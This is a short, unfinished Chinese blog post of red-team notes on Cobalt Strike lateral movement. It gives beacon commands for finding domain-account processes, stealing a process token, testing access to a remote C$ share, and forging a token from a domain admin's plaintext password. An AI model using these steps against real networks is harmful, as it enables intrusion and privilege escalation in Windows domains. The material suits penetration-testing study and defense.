    <h1 class="article-title">Cobaltstrike-Pth(pass the Hash)</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#待补充"><span class="toc-text">待补充</span></a></li></ol>

  <div class="post-content">
    <p>寻找运行在域账号权限下的进程(有可能遇到Domain Admin)<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">shell</span><span class="bash"> tasklist /v</span></span><br></pre></td></tr></table></figure></p>
<p>模拟令牌<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">steal_token</span> pid</span><br></pre></td></tr></table></figure></p>
<p>尝试利用<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>\c$</span><br></pre></td></tr></table></figure></p>
<p>或者在得到域管明文密码的情况下，可以制作令牌来进行传递操作：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; help make_token</span><br><span class="line">Use: make_token [DOMAIN\user] [password]</span><br><span class="line"></span><br><span class="line">Clone the current access token <span class="keyword">and</span> <span class="builtin-name">set</span> it up <span class="keyword">to</span> pass the specified username</span><br><span class="line"><span class="keyword">and</span> password when you interact with<span class="built_in"> network </span>resources. This command does <span class="keyword">not</span></span><br><span class="line">validate the credentials you provide <span class="keyword">and</span> it has <span class="literal">no</span> effect on local actions.</span><br><span class="line">eg:</span><br><span class="line">make_toke x51.test\administrator password4administrator</span><br></pre></td></tr></table></figure></p>
<p>cobaltstrike官方博客介绍</p>
